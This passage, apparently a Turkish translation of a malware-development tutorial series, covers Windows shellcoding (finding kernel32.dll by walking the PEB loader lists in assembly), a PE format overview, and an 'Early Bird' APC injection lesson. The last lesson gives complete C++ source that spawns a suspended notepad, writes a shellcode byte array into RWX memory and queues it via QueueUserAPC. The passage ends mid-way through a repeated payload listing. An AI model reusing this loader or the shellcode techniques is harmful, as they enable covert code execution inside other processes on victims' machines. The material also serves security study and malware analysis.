Hesap makinesi (calc.exe) süreci, ana süreç sona erdikten sonra bile çalışmaya devam eder, çünkü bu, kendi başına bir süreçtir.Yani, kabuk kodumuz mükemmel bir şekilde çalıştı :) 
Örneğin, Windows için kendi kabuk kodunuzu bu şekilde oluşturabilirsiniz.
Ancak, bir sorun var. Bu kabuk kodu yalnızca bu makinede çalışacaktır. Çünkü, tüm DLL'lerin ve işlevlerinin adresleri yeniden başlatıldığında değişir ve her sistemde farklıdır. Bu kodun herhangi bir Windows 7 x86 SP1 sisteminde çalışabilmesi için, ASM'in işlevlerin adreslerini kendisinin bulması gerekir. Bunu bir sonraki bölümde yapacağım.
WinExec(https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec)
ExitProcess(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess)
The Shellcoder’s Handbook(https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)
my intro to x86 assembly(https://cocomelonc.github.io/tutorial/2021/10/03/malware-analysis-1.html)
my nasm tutorial(https://cocomelonc.github.io/tutorial/2021/10/08/malware-analysis-2.html)
linux shellcoding part 1(https://cocomelonc.github.io/tutorial/2021/10/09/linux-shellcoding-1.html)
linux shellcoding part 2(https://cocomelonc.github.io/tutorial/2021/10/17/linux-shellcoding-2.html)
Github’taki kaynak kod: https://github.com/cocomelonc/2021-10-26-windows-shellcoding-1
11. Windows Shellcoding - Bölüm 2. Kernel32 Adresini Bulma
Bismillah
++++++++++++++++++
Windows shellcoding hakkındaki yazımın ilk bölümünde, aşağıdaki mantığı kullanarak kernel32 ve işlevlerin adreslerini bulmuştuk:
/*
getaddr.c - get addresses of functions
(ExitProcess, WinExec) in memory
*/
#include <windows.h>
#include <stdio.h>
int main() {
	unsigned long Kernel32Addr; // kernel32.dll address
	unsigned long ExitProcessAddr; // ExitProcess address
	unsigned long WinExecAddr; // WinExec address

	Kernel32Addr = GetModuleHandle("kernel32.dll");
	printf("KERNEL32 address in memory: 0x%08p\n", Kernel32Addr);

	ExitProcessAddr = GetProcAddress(Kernel32Addr, "ExitProcess");
	printf("ExitProcess address in memory is: 0x%08p\n");
	ExitProcessAddr);

	WinExecAddr = GetProcAddress(Kernel32Addr, "WinExec");
	printf("WinExec address in memory is: 0x%08p\n", WinExecAddr);

	getchar();
	return 0;
}
Daha sonra, bulduğumuz adresi kabuk kodumuza girdik:
; void ExitProcess([in] UINT uExitCode);
xor eax, eax 		; zero out eax
push eax 		; push NULL
mov eax, 0x76ed214f ; call ExitProcess function
			; addr in kernel32.dll
jmp eax ; execute the ExitProcess function
Sorun şu ki, tüm DLL'lerin ve işlevlerinin adresleri yeniden başlatıldığında değişir ve her sistemde farklıdır. Bu nedenle, ASM kodumuza herhangi bir adresi sabit olarak yazamayız.
+++++++++++
Öncelikle, kernel32.dll adresini nasıl buluruz?
TEB ve PEB Yapıları
Herhangi bir exe dosyasını çalıştırdığımızda, işletim sisteminde (bildiğim kadarıyla) ilk oluşturulan şeylerden biri PEB'dir:
typedef struct _PEB {
	BYTE 							Reserved1[2];
	BYTE 							BeingDebugged;
	BYTE 							Reserved2[1];
	PVOID 						Reserved3[2];
	PPEB_LDR_DATA 					Ldr;
	PRTL_USER_PROCESS_PARAMETERS      ProcessParameters;
	PVOID 						Reserved4[3];
	PVOID 						AtlThunkSListPtr;
	PVOID 						Reserved5;
	ULONG 						Reserved6;
	PVOID 						Reserved7;
	ULONG 						Reserved8;
	ULONG 						AtlThunkSListPtr32;
	PVOID 						Reserved9[45];
	BYTE 							Reserved10[96];
	PPS_POST_PROCESS_INIT_ROUTINE 	PostProcessInitRoutine;
	BYTE 							Reserved11[128];
	PVOID 						Reserved12[1];
	ULONG 						SessionId;
} PEB, *PPEB;

ve TEB için:

typedef struct _TEB {
	PVOID 	Reserved1[12];
	PPEB 		ProcessEnvironmentBlock;
	PVOID 	Reserved2[399];
	BYTE 		Reserved3[1952];
	PVOID 	TlsSlots[64];
	BYTE 		Reserved4[8];
	PVOID 	Reserved5[26];
	PVOID 	ReservedForOle;
	PVOID 	Reserved6[4];
	PVOID 	TlsExpansionSlots;
} TEB, *PTEB;
PEB-Windows'ta süreç oluşturma aşamasında yükleyici tarafından doldurulan bir süreç yapısıdır ve sürecin çalışması için gerekli bilgileri içerir.
TEB, mevcut süreçteki iş parçacıkları hakkında bilgi depolamak için kullanılan bir yapıdır ve her iş parçacığının kendi TEB'si vardır.
Şimdi, windbg hata ayıklayıcısında bir program açalım ve şu komutu çalıştıralım:
dt _teb
+++++++++++++++++
Gördüğümüz gibi, PEB'in 0x030 ofseti bulunmaktadır. Benzer şekilde, PEB yapısının içeriğini şu komutla görebiliriz:
dt _peb
++++++++++++++++++
Şimdi, PEB yapısının başlangıcından 0x00c ofsetinde bulunan üyeye, yani PEB_LDR_DATA'ya bakmamız gerekiyor. PEB_LDR_DATA, sürecin yüklü modülleri hakkında bilgi içerir.
Daha sonra, windbg kullanarak PEB_LDR_DATA yapısını da inceleyebiliriz:
dt _PEB_LDR_DATA
++++++++++++++++++
Burada, InLoadOrderModuleList'in ofsetinin 0x00c, InMemoryOrderModuleList'in 0x014 ve InInitializationOrderModuleList'in 0x01c olduğunu görebiliriz.
InMemoryOrderModuleList, her liste öğesinin bir LDR_DATA_TABLE_ENTRY yapısına işaret ettiği çift bağlantılı bir listedir, bu nedenle Windbg bu yapının türünü LIST_ENTRY olarak belirtiyor.
Devam etmeden önce şu komutu çalıştıralım:
!peb
+++++++++++++++++++
Gördüğümüz gibi, LDR (PEB yapısı) adresi - 77328880.
Şimdi InLoadOrderModuleList, InMemoryOrderModuleList ve InInitializationOrderModuleList adreslerini görmek için şu komutu çalıştıralım:
dt _PEB_LDR_DATA 77328880
Bu, bağlantılı listelerin ilgili başlangıç ve bitiş adreslerini gösterecektir:
++++++++++++++++++++
LDR_DATA_TABLE_ENTRY yapısına yüklenmiş modülleri görüntülemeyi deneyelim ve yüklü modüllerin temel adreslerini görebilmemiz için bu yapının başlangıç adresini 0x5119f8 olarak belirteceğiz. Unutmayın ki, 0x5119f8 bu yapının adresidir, bu yüzden ilk giriş bu adresten 8 byte daha az olacaktır:
dt _LDR_DATA_TABLE_ENTRY 0x5119f8-8
++++++++++++++++++++
Gördüğünüz gibi, BaseDllName bizim exit.exe'miz. Bu, benim çalıştırdığım exe dosyasıdır.Ayrıca, InMemoryOrderLinks adresinin şimdi 0x511a88 olduğunu görebilirsiniz. 0x018 ofsetindeki DllBase, BaseDllName'in temel adresini içerir. Şimdi, bir sonraki yüklü modülümüz 0x511a88'den 8 byte uzaklıkta olmalıdır, yani 0x5119f8-8:
dt _LDR_DATA_TABLE_ENTRY 0x5119f8-8
++++++++++++++++++++
Gördüğünüz gibi, BaseDllName ntdll.dll'dir. Adresi 0x77250000'dir ve bir sonraki modül 0x511e58'den 8 byte sonra bulunur. Sonra:
dt _LDR_DATA_TABLE_ENTRY 0x511e58-8
++++++++++++++++++++
Gördüğünüz gibi, üçüncü modülümüz kernel32.dll'dir ve adresi 0x76fd0000, ofseti ise 0x018'dir. Bunun doğru olduğundan emin olmak için getaddr.exe programımızı çalıştırabiliriz:
++++++++++++++++++++
Bu modül yükleme sırası, en azından bildiğim kadarıyla, Windows 10 ve 7 için her zaman sabit kalacaktır. Bu nedenle, ASM ile yazarken, tüm PEB LDR yapısını tarayarak kernel32.dll adresini bulabilir ve kabuk kodumuza yükleyebiliriz.
İlk bölümde yazdığım gibi, bir sonraki modül kernelbase.dll olmalıdır. Sadece bir deney yapmak ve bunun doğru olduğundan emin olmak için şu komutu çalıştırabiliriz:
dt _LDR_DATA_TABLE_ENTRY 0x511f70-8
++++++++++++++++++++
Böylece aşağıdaki bilgiler elde edilir:
PEB yapısına olan ofset: 0x030
PEB içindeki LDR'ye olan ofset: 0x00c
InMemoryOrderModuleList'e olan ofset: 0x014
İlk yüklü modül bizim .exe dosyamızdır.
İkinci yüklü modül ntdll.dll'dir.
Üçüncü yüklü modül kernel32.dll'dir.
Dördüncü yüklü modül kernelbase.dll'dir.
Son zamanlardaki tüm Windows OS sürümlerinde (bildiğim kadarıyla), FS kaydı TEB'i işaret eder. Dolayısıyla, kernel32.dll'imizin temel adresini almak için (kernel.asm):
; find kernel32
; author @cocomelonc
; nasm -f win32 -o kernel.o kernel.asm
; ld -m i386pe -o kernel.exe kernel.o
; 32-bit windows
section .data

section .bss

section .text
	global _start 			; must be declared for linker
_start:
	mov eax, [fs:ecx + 0x30]    ; offset to the PEB struct
	mov eax, [eax + 0xc] 	; offset to LDR within PEB
	mov eax, [eax + 0x14] 	; offset to
					; InMemoryOrderModuleList
	mov eax, [eax] 		; kernel.exe address loaded
					; in eax (1st module)
	mov eax, [eax] 		; ntdll.dll address loaded
					; (2nd module)
	mov eax, [eax + 0x10] 	; kernel32.dll address
					; loaded (3rd module)

Bu assembly kodu ile kernel32.dll adresini bulabilir ve EAX kaydında depolayabiliriz. Şimdi bunu derleyelim:
nasm -f win32 -o kernel.o kernel.asm
ld -m i386pe -o kernel.exe kernel.o
++++++++++++++++++++
Bunu kopyalayıp ve hata ayıklayıcıyı kullanarak Windows 7’de çalıştıralım:
++++++++++++++++++++
Çalıştır:
++++++++++++++++++++
Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı!
Bir sonraki adım, LoadLibraryA kullanarak bir işlevin (örneğin, ExitProcess) adresini bulmak ve bu işlevi çağırmak olacak. Bu konu bir sonraki bölümde ele alınacak.
History and Advances in Windows Shellcode(http://www.phrack.org/archives/issues/62/7.txt)
PEB structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)
TEB structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-teb)
PEB_LDR_DATA structure(https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data)
The Shellcoder’s Handbook(https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)
windows shellcoding part 1(https://cocomelonc.github.io/tutorial/2021/10/27/windows-shellcoding-1.html)
Github’taki kaynka kod: https://github.com/cocomelonc/2021-10-30-windows-shellcoding-2 
12. Windows Shellcoding - Bölüm 3. PE Dosya Formatı
Bismillah
+++++++++++++++
Bu bölüm, önceki bölümlerin bir devamı olarak okunabileceği gibi, aynı zamanda bağımsız bir materyal olarak da okunabilir. Bu, PE dosya formatının genel bir incelemesidir:
PE Dosyası
PE dosya formatı nedir? Win32'nin yerel dosya formatıdır. Spesifikasyonu, bir anlamda Unix Coff (Common Object File Format) formatından türetilmiştir. 'Portable Executable' (Taşınabilir Çalıştırılabilir) terimi, dosya formatının Win32 platformu genelinde evrensel olduğu anlamına gelir: Her Win32 platformunun PE yükleyicisi bu dosya formatını tanır ve kullanır, hatta Windows Intel dışındaki CPU platformlarında çalışıyor olsa bile. Ancak, PE yürütülebilir dosyalarınızın değişiklik yapmadan diğer CPU platformlarına taşınabileceği anlamına gelmez. Dolayısıyla, PE dosya formatını incelemek, Windows'un yapısına dair değerli bilgiler sağlar.

Temelde, PE dosya yapısı şu şekilde görünür:
+++++++++++++++++
PE dosya formatı esasen PE başlığı tarafından tanımlanır, bu nedenle öncelikle bu başlık hakkında bilgi edinmek isteyebilirsiniz. Her bir parçasını anlamanıza gerek yok, ancak yapısı hakkında bir fikir edinmeli ve en önemli bölümleri tanıyabilmelisiniz.
DOS Başlığı
DOS başlığı, PE dosyasını yüklemek için gerekli bilgileri saklar. Bu nedenle, bir PE dosyasını yüklemek için bu başlık zorunludur.
DOS başlığı yapısı:
typedef struct _IMAGE_DOS_HEADER {// DOS .EXE header
	WORD e_magic; 		// Magic number
	WORD e_cblp; /		/ Bytes on last page of file
	WORD e_cp; 		// Pages in file
	WORD e_crlc; 		// Relocations
	WORD e_cparhdr;		 // Size of header in paragraphs
	WORD e_minalloc; 		// Minimum extra paragraphs needed
	WORD e_maxalloc; 	// Maximum extra paragraphs needed
	WORD e_ss; 		// Initial (relative) SS value
	WORD e_sp; 		// Initial SP value
	WORD e_csum; 		// Checksum
	WORD e_ip; 			// Initial IP value
	WORD e_cs; 		// Initial (relative) CS value
	WORD e_lfarlc;		 // File address of relocation table
	WORD e_ovno; 		// Overlay number
	WORD e_res[4]; 		// Reserved words
	WORD e_oemid; 		// OEM identifier (for e_oeminfo)
	WORD e_oeminfo; 		// OEM information; e_oemid specific
	WORD e_res2[10]; 		// Reserved words
	LONG e_lfanew; 		// File address of new exe header
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
ve bu 64 baytlık bir boyuta sahiptir. Bu yapıda en önemli alanlar e_magic ve e_lfanew’dir. Başlığın ilk iki byte’ı, dosya türünü tanımlayan sihirli byte’lardır: 4D 5A veya MZ, Microsoft'ta DOS üzerinde çalışan Mark Zbikowski'nin baş harfleridir. Bu sihirli byte’lar, dosyayı bir PE dosyası olarak tanımlar:
++++++++++++++++
e_lfanew - DOS HEADER'ın 0x3c ofsetinde bulunur ve PE başlığına olan ofseti içerir.
++++++++++++++++

DOS Stub

Dosyanın ilk 64 baytından sonra bir DOS stub başlar. Bu alan bellekte çoğunlukla sıfırlarla doldurulur:
+++++++++++++++++
PE Başlığı
Bu kısım küçüktür ve yalnızca sihirli baytlar olan `PE\0\0` veya `50 45 00 00` şeklinde bir dosya imzasını içerir:
+++++++++++++++
Yapısı:
typedef struct _IMAGE_NT_HEADERS {
	DWORD Signature;
	IMAGE_FILE_HEADER FileHeader;
	IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
Bu yapıya daha yakından bakalım.
Dosya Başlığı (veya COFF Başlığı) - dosyanın temel özelliklerini tanımlayan bir alan kümesidir:
typedef struct _IMAGE_FILE_HEADER {
	WORD Machine;
	WORD NumberOfSections;
	DWORD TimeDateStamp;
	DWORD PointerToSymbolTable;
	DWORD NumberOfSymbols;
	WORD SizeOfOptionalHeader;
	WORD Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
+++++++++++++++
Opsiyonel Başlık - COFF nesne dosyaları bağlamında isteğe bağlıdır, ancak PE dosyaları için değildir. Bu başlık AddressOfEntryPoint, ImageBase, Section Alignment, SizeOfImage, SizeOfHeaders ve DataDirectory gibi birçok önemli değişkeni içerir. Bu yapının 32-bit ve 64-bit versiyonları vardır:
typedef struct _IMAGE_OPTIONAL_HEADER {
	//
	// Standard fields.
	//
	WORD Magic;
	BYTE MajorLinkerVersion;
	BYTE MinorLinkerVersion;
	DWORD SizeOfCode;
	DWORD SizeOfInitializedData;
	DWORD SizeOfUninitializedData;
	DWORD AddressOfEntryPoint;
	DWORD BaseOfCode;
	DWORD BaseOfData;
	//
	// NT additional fields.
	//
	DWORD ImageBase;
	DWORD SectionAlignment;
	DWORD FileAlignment;
	WORD MajorOperatingSystemVersion;
	WORD MinorOperatingSystemVersion;
	WORD MajorImageVersion;
	WORD MinorImageVersion;
	WORD MajorSubsystemVersion;
	WORD MinorSubsystemVersion;
	DWORD Win32VersionValue;
	DWORD SizeOfImage;
	DWORD SizeOfHeaders;
	DWORD CheckSum;
	WORD Subsystem;
	WORD DllCharacteristics;
	DWORD SizeOfStackReserve;
	DWORD SizeOfStackCommit;
	DWORD SizeOfHeapReserve;
	DWORD SizeOfHeapCommit;
	DWORD LoaderFlags;
	DWORD NumberOfRvaAndSizes;
	IMAGE_DATA_DIRECTORY
	DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

+++++++++++++++++++++++
Burada, dikkat çekmek istediğim şey IMAGE_DATA_DIRECTORY'dir:
typedef struct _IMAGE_DATA_DIRECTORY {
	DWORD VirtualAddress;
	DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
Bu bir veri dizinidir. Basitçe, her biri 2 DWORD değerinden oluşan bir yapıya sahip 16 elemanlık bir dizidir.
Şu anda, PE dosyaları aşağıdaki veri dizinlerini içerebilir:  
- Export Table  
- Import Table  
- Resource Table  
- Exception Table  
- Certificate Table  
- Base Relocation Table  
- Debug  
- Architecture  
- Global Ptr  
- TLS Table  
- Load Config Table  
- Bound Import  
- IAT (Import Address Table)  
- Delay Import Descriptor  
- CLR Runtime Header  
- Reserved, must be zero  

Daha önce yazdığım gibi, bunlardan sadece bazılarını daha ayrıntılı olarak ele alacağım.
Section Tablosu
Bu, PE dosyasının .text ve .data gibi bölümlerini tanımlayan IMAGE_SECTION_HEADER yapılarını içeren bir dizidir. IMAGE_SECTION_HEADER yapısı:
typedef struct _IMAGE_SECTION_HEADER {
	BYTE Name[IMAGE_SIZEOF_SHORT_NAME];
	union {
		DWORD PhysicalAddress;
		DWORD VirtualSize;
	} Misc;
	DWORD VirtualAddress;
	DWORD SizeOfRawData;
	DWORD PointerToRawData;
	DWORD PointerToRelocations;
	DWORD PointerToLinenumbers;
	WORD NumberOfRelocations;
	WORD NumberOfLinenumbers;
	DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
ve 0x28 bayttan oluşur.
Bölümler
Bölüm tablosundan sonra, gerçek bölümler gelir: 
+++++++++++++
Uygulamalar fiziksel belleğe doğrudan erişmez, yalnızca sanal belleğe erişir. Bölümler, sanal belleğe aktarılmış bir alanı temsil eder ve tüm işlem bu verilerle doğrudan yapılır. Sanal bellekteki ofsetler olmayan bir adres, Sanal Adres (Virtual adres) olarak adlandırılır. Başka bir deyişle, Sanal adresler, bir uygulamanın başvurduğu bellek adresleridir.ImageBase alanında ayarlanan uygulama için tercih edilen indirme konumu, sanal bellekte bir uygulama alanının başladığı noktaya benzer. Ve RVA (Relative Virtual Address) ofsetleri bu noktaya göre ölçülür. RVA'yı şu formülle hesaplayabiliriz: RVA = VA - ImageBase. ImageBase her zaman bilinir ve VA veya RVA'ya sahip olduğumuzda, biri diğerinden türetilebilir.
Her bölümün boyutu bölüm tablosunda sabittir, bu nedenle bölümler belirli bir boyutta olmalı ve bunun için NULL baytlarla (00) doldurulurlar.
Bir Windows NT uygulaması genellikle .text, .bss, .rdata, .data, .rsrc gibi farklı önceden tanımlanmış bölümlere sahiptir. Uygulamaya bağlı olarak, bu bölümlerin bazıları kullanılır, ancak hepsi kullanılmaz.

.text		Windows'ta, tüm kod segmentleri .text adlı bir bölümde bulunur.

.rdata		Salt okunur veriler, dosya sistemindeki dizgiler ve sabitler gibi, .rdata adlı bir  bölümde bulunur.

.rsrc        Bu, bir kaynak bölümüdür ve kaynak bilgilerini içerir. Çoğu durumda, dosyanın kaynaklarının bir parçası olan simgeleri ve görüntüleri gösterir. Diğer bölümlerin çoğu gibi, bu bölüm bir kaynak dizin yapısıyla başlar, ancak bu bölümün verileri bir kaynak ağacında daha fazla yapılandırılır.
typedef struct _IMAGE_RESOURCE_DIRECTORY {
	DWORD Characteristics;
	DWORD TimeDateStamp;
	WORD MajorVersion;
	WORD MinorVersion;
	WORD NumberOfNamedEntries;
	WORD NumberOfIdEntries;
} IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;
.edata  	Bu bölüm, bir uygulama veya DLL için dışa aktarma verilerini içerir.    Bulunduğunda, dışa aktarma bilgilerine erişmek için bir dışa aktarma dizini içerir.IMAGE_EXPORT_DIRECTORY yapısı şunları içerir:
typedef struct _IMAGE_EXPORT_DIRECTORY {
	ULONG Characteristics;
	ULONG TimeDateStamp;
	USHORT MajorVersion;
	USHORT MinorVersion;
	ULONG Name;
	ULONG Base;
	ULONG NumberOfFunctions;
	ULONG NumberOfNames;
	PULONG *AddressOfFunctions;
	PULONG *AddressOfNames;
	PUSHORT *AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
Dışa aktarılan semboller genellikle DLL'lerde bulunur, ancak DLL'ler sembolleri de içe aktarabilir. Dışa aktarma tablosunun temel amacı, dışa aktarılan işlevlerin adlarını ve/veya numaralarını RVA ile ilişkilendirmektir, yani süreç bellek haritasındaki konumlarıyla.
İçe Aktarma Adres Tablosu (Import Address Table)
İçe Aktarma Adres Tablosu, işlev işaretçileri içerir ve DLL'ler yüklendiğinde işlevlerin adreslerini almak için kullanılır. Derlenmiş bir uygulama, tüm API çağrılarının doğrudan kodlanmış adresler yerine bir işlev işaretçisi aracılığıyla çalışması için tasarlanmıştır.
Sonuç
PE dosya formatı, burada yazdığımdan daha karmaşıktır. Örneğin, Windows yürütülebilir dosyalar hakkında ilginç bir görsel örnek, Ange Albertini'nin Github projesi Corkami(https://github.com/corkami/pics/blob/master/binary/pe101/README.md)'de bulunabilir:  
++++++++++++++++++++
PE bear(https://github.com/hasherezade/pe-bear-releases)
MSDN PE format(https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)
Corkami(https://github.com/corkami/pics/blob/master/binary/pe101/README.md)
An In-Depth Look into the Win32 Portable Executable File Format(https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/inside-windows-win32-portable-executable-file-format-in-detail)
An In-Depth Look into the Win32 Portable Executable File Format, Part 2(https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/march/inside-windows-an-in-depth-look-into-the-win32-portable-executable-file-format-part-2)
MSDN IMAGE_NT_HEADERS(https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32)
MSDN IMAGE_FILE_HEADER(https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header)
MSDN IMAGE_OPTIONAL_HEADER(https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32)
MSDN IMAGE_DATA_DIRECTORY(https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory)

13. APC Enjeksiyon Tekniği. Basit C++ Zararlı Yazılım
Bismillah
++++++++++++++++++++
Önceki bölümlerde, klasik kod enjeksiyonunu ve klasik DLL enjeksiyonunu yazmıştım. 
Bugün bu bölümde, 'Early Bird' APC enjeksiyon tekniğini ele alacağım. Bugün, belirli bir iş parçacığını sıraya almak için asenkron prosedür çağrısından faydalanan QueueUserAPC'ye bakacağız.
Her iş parçacığının kendi APC kuyruğu vardır. Bir uygulama, QueueUserAPC işlevini çağırarak bir APC'yi bir iş parçacığına sıraya alır. Çağrı yapan iş parçacığı, QueueUserAPC çağrısında bir APC işlevinin adresini belirtir. Bir APC'nin sıraya alınması, iş parçacığının APC işlevini çağırması için bir istektir.
Bu tekniğin yüksek seviyede genel bir özeti şu şekildedir:
Öncelikle, zararlı programımız yeni bir meşru süreç oluşturur (bizim durumumuzda notepad.exe):
++++++++++++++++++++
+++++++++++++++++++
CreateProcess çağrısını her gördüğümüzde, dikkat etmek isteyeceğimiz iki önemli parametre vardır: birincisi (çağrılacak yürütülebilir dosya) ve altıncısı (süreç oluşturma bayrakları). Oluşturma bayrağı CREATE_SUSPENDED olarak ayarlanmıştır.
Daha sonra, payload için bellek, yeni oluşturulan sürecin bellek alanında tahsis edilir:
+++++++++++++++++++
++++++++++++++++++++
Daha önceki yazılarımda belirttiğim gibi, VirtualAlloc ve VirtualAllocEx arasında çok önemli bir fark vardır. İlki, çağrı yapan sürecin belleğinde bellek tahsis ederken, ikincisi uzak bir süreçte bellek tahsis eder. Yani, eğer zararlı yazılımın VirtualAllocEx çağrısı yaptığını görürsek, büyük olasılıkla bir tür süreçler arası etkinlik başlamış olacaktır.
Kabuk koduna işaret eden APC rutini tanımlanır.
Ardından payload, tahsis edilen belleğe yazılır:
++++++++++++++++++++++
APC, şu anda askıya alınmış durumda olan ana iş parçacığına sıraya alınır:
++++++++++++++++
+++++++++++++++++++
Son olarak, iş parçacığı devam ettirilir ve yükümüz çalıştırılır:
++++++++++++++++++++
+++++++++++++++++++++
Yani, tam kaynak kodumuz şu şekilde (evil.cpp):
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// our payload calc.exe
unsigned char my_payload[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
	0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
	0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
	0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
	0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
	0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
	0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
	0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
	0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
	0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
	0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
	0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
	0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
	0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
	0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
	0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
	0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
	0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
	0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
	0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
};
int main() {
	// Create a 64-bit process:
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID my_payload_mem;
	SIZE_T my_payload_len = sizeof(my_payload);
	LPCWSTR cmd;
	HANDLE hProcess, hThread;
	NTSTATUS status;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	CreateProcessA(
		"C:\\Windows\\System32\\notepad.exe",
		NULL, NULL, NULL, false,
		CREATE_SUSPENDED, NULL, NULL, &si, &pi
	);
	WaitForSingleObject(pi.hProcess, 5000);
	hProcess = pi.hProcess;
	hThread = pi.hThread;

	// allocate a memory buffer for payload
	my_payload_mem = VirtualAllocEx(hProcess, NULL, my_payload_len,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// write payload to allocated buffer
	WriteProcessMemory(hProcess,
	my_payload_mem,
	my_payload,
	my_payload_len, NULL);

	// inject into the suspended thread.
	PTHREAD_START_ROUTINE apc_r = (PTHREAD_START_ROUTINE)my_payload_mem;
	QueueUserAPC((PAPCFUNC)apc_r, hThread, NULL);

	// resume to suspended thread
	ResumeThread(hThread);
return 0;
}
Gördüğünüz gibi, basitlik adına payload olarak 64-bit calc.exe kullanıyoruz. Payload oluşturulması detaylarına girmeden, payload’ı doğrudan kodumuza yerleştireceğiz:
unsigned char my_payload[] = {
	0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
	0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
	0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
	0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
	0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
	0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
	0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
	0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
	0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
	0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
